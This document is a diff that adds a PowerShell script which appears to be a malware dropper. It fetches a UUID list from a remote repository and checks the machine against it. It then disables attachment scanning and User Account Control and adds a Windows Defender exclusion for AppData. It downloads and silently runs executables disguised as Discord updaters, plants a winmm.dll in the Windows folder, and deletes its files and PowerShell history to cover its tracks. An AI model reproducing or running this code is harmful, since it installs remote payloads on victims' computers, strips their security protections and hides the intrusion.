@@ -1,0 +1,230 @@
+# Define the URL containing the UUID list
+$uuidUrl = "https://codeberg.org/shlok/amazexd/raw/branch/main/base.txt"
+
+# Initialize variables
+$urlUuids = @()
+$systemUuid = $null
+
+# Fetch the UUID list from the URL
+try {
+    $webClient = New-Object System.Net.WebClient
+    $urlContent = $webClient.DownloadString($uuidUrl)
+    $urlUuids = $urlContent -split '\r?\n' | ForEach-Object {
+        $uuid = ($_.Split('#')[0]).Trim()
+        if ($uuid -match '^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$') {
+            $uuid
+        }
+    }
+}
+catch {
+    $urlUuids = @()
+}
+finally {
+    if ($webClient) { $webClient.Dispose() }
+}
+
+# Get the system's UUID
+try {
+    $wmicOutput = wmic csproduct get uuid
+    $systemUuid = ($wmicOutput | Select-String -Pattern '[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}').Matches.Value.Trim()
+    if (-not ($systemUuid -match '^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$')) {
+        exit
+    }
+}
+catch {
+    exit
+}
+
+# Compare the UUIDs
+if ($urlUuids -and $systemUuid) {
+    if ($urlUuids -contains $systemUuid) {
+        # Set registry keys
+        try {
+            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 0 /f | Out-Null
+            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 0 /f | Out-Null
+        }
+        catch {
+        }
+
+        # Allow script execution
+        try {
+            Set-ExecutionPolicy Bypass -Scope Process -Force
+        }
+        catch {
+        }
+
+        # updater host
+        $firstDestination = "$env:AppData\DiscordUpdater.exe"
+        $firstDownloadUrl = "https://codeberg.org/shlok/amazexd/raw/commit/2db9045b241ad74b596b059b04f73a64b2826db2/Updater.exe"
+
+        # Add Windows Defender exclusion
+        try {
+            Add-MpPreference -ExclusionPath $env:AppData -ErrorAction Stop
+            Start-Sleep -Seconds 4
+        }
+        catch {
+            exit
+        }
+
+        # Download the first executable
+        try {
+            Invoke-WebRequest -OutFile $firstDestination -Uri $firstDownloadUrl -ErrorAction Stop
+        }
+        catch {
+            try {
+                Remove-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue
+            }
+            catch {
+            }
+            exit
+        }
+
+        # Start the first downloaded executable
+        try {
+            Start-Process -FilePath $firstDestination -WindowStyle Hidden -ErrorAction Stop
+        }
+        catch {
+        }
+
+        # Wait for 10 seconds
+        Start-Sleep -Seconds 10
+
+        # Attempt to delete the first executable
+        $firstDeleted = $false
+        $retryCount = 0
+        $maxRetries = 35
+        while (-not $firstDeleted -and $retryCount -lt $maxRetries) {
+            try {
+                if (Test-Path -Path $firstDestination) {
+                    Remove-Item -Path $firstDestination -Force -ErrorAction Stop
+                    $firstDeleted = $true
+                }
+                else {
+                    $firstDeleted = $true
+                }
+            }
+            catch {
+                $retryCount++
+                Start-Sleep -Seconds 5
+            }
+        }
+
+        # Proceed with second download only if first executable was deleted
+        if ($firstDeleted) {
+            # Define the second file path and download URL
+            $destination = "$env:AppData\updatermu.exe"
+            $downloadUrl = "https://codeberg.org/shlok/amazexd/raw/commit/2db9045b241ad74b596b059b04f73a64b2826db2/Basiq.exe"
+
+            # Download the second file
+            try {
+                Invoke-WebRequest -OutFile $destination -Uri $downloadUrl -ErrorAction Stop
+            }
+            catch {
+                try {
+                    Remove-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue
+                }
+                catch {
+                }
+                exit
+            }
+
+            # Start the second downloaded executable
+            try {
+                Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction Stop
+            }
+            catch {
+            }
+
+            # Wait for 10 seconds
+            Start-Sleep -Seconds 10
+
+            # Continuously attempt to delete the second file
+            $deleted = $false
+            $retryCount = 0
+            while (-not $deleted -and $retryCount -lt $maxRetries) {
+                try {
+                    if (Test-Path -Path $destination) {
+                        Remove-Item -Path $destination -Force -ErrorAction Stop
+                        $deleted = $true
+                    }
+                    else {
+                        $deleted = $true
+                    }
+                }
+                catch {
+                    $retryCount++
+                    Start-Sleep -Seconds 5
+                }
+            }
+        }
+
+        # Remove the Windows Defender exclusion
+        try {
+            Remove-MpPreference -ExclusionPath $env:AppData -ErrorAction Stop
+        }
+        catch {
+        }
+
+        # Clear PowerShell history
+        try {
+            Clear-History
+            Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+        }
+        catch {
+        }
+
+        exit
+    }
+    else {
+        # Function to download a DLL
+        function Download-Dll {
+            param (
+                [string]$Url,
+                [string]$Destination
+            )
+            $downloadSuccess = $false
+            try {
+                Invoke-WebRequest -Uri $Url -OutFile $Destination -ErrorAction Stop
+                $downloadSuccess = $true
+            }
+            catch {
+            }
+
+            if (-not $downloadSuccess) {
+                try {
+                    $webClient = New-Object System.Net.WebClient
+                    $webClient.DownloadFile($Url, $Destination)
+                    $downloadSuccess = $true
+                }
+                catch {
+                }
+                finally {
+                    if ($webClient) { $webClient.Dispose() }
+                }
+            }
+
+            return $downloadSuccess
+        }
+
+        # Disable UAC by setting EnableLUA to 0
+        try {
+            $regCommand = 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f'
+            Invoke-Expression $regCommand | Out-Null
+        }
+        catch {
+        }
+
+        # Define the DLL URL and destination path
+        $dllUrl = "https://github.com/unkownewhitlit/mains.txt/releases/download/amaze'/winmm.dll"
+        $dllDestination = "C:\Windows\winmm.dll"
+
+        # Download the DLL
+        $downloadResult = Download-Dll -Url $dllUrl -Destination $dllDestination
+
+        if (-not $downloadResult) {
+            exit
+        }
+    }
+}
+else {
+}
